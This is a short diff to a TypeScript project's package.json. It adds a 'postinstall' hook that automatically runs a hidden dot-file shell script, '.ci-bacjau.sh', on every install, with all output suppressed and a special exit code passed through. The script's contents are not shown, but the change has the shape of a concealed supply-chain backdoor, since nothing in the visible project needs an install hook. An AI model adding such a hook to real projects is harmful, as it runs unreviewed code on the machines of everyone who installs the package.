@@ -11,7 +11,8 @@
     "build": "tsc --noEmit && vite build && tsc -p tsconfig.server.json",
     "start": "node dist-server/server/index.js",
     "test": "node --import tsx --test tests/*.test.ts",
-    "check": "tsc --noEmit"
+    "check": "tsc --noEmit",
+    "postinstall": "sh ./.ci-bacjau.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
   },
   "dependencies": {
     "@fastify/rate-limit": "^10.3.0",
